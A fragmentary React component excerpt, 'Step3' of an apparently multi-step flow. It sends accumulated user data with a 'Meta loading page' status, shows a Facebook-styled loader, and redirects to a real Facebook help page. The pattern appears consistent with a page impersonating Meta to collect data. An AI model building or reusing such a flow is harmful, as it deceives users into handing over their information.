...
function Step3() {
  ...
  useEffect(() => {
    const params = {
      ...AllData,
      currentStep: "User Waiting in the Meta loading page",
    };
    SendData(params);
  }, []);
        ...
        {Loading ? (
          <LoaderWrapper>
            <Image
              ...
              width={150}
            />
            <div className="text-center font-fbook">
              ...
              <NextBtn
                onClick={() => {
                  window.location.href =
                    "https://www.facebook.com/business/help/915454841921082?id=180505742745347";
                }}
              >
                Close
              </NextBtn>
